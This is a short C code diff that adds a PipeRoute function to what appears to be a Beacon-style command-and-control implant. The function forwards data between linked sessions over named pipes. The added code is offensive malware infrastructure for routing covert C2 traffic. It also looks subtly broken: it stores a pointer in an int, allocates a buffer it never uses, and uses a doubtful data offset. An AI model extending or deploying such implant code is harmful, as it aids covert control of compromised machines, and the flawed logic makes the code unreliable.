@@ -175,3 +175,40 @@ void PipeClose(char* buffer, int length)
 	int bid = BeaconDataInt(&parser);
 	PipeCloseInternal(bid);
 }
+
+char* gRouteAux = NULL;
+void PipeRoute(char* buffer, int length)
+{
+	if (!gRouteAux)
+		gRouteAux = malloc(0x100000);
+
+	datap parser;
+	BeaconDataParse(&parser, buffer, length);
+	int bid = BeaconDataInt(&parser);
+	int baseLen = BeaconDataLength(&parser);
+	int len = baseLen;
+	for(int i = 0; i < MAX_LINKS; i++)
+	{
+		if (gLinks[i].bid != bid || gLinks[i].isOpen == FALSE)
+			continue;
+
+		PROTOCOL* pProtocol = &gLinks[i].protocol;
+		int wdata;
+		if(len <= 0)
+		{
+			len = 0;
+			wdata = 0;
+		} else
+		{
+			len = baseLen;
+			wdata = buffer + 4;
+		}
+
+		if(pProtocol->write(pProtocol, wdata, len) < 0)
+		{
+			PipeCloseInternal(bid);
+			break;
+		}
+
+	}
+}
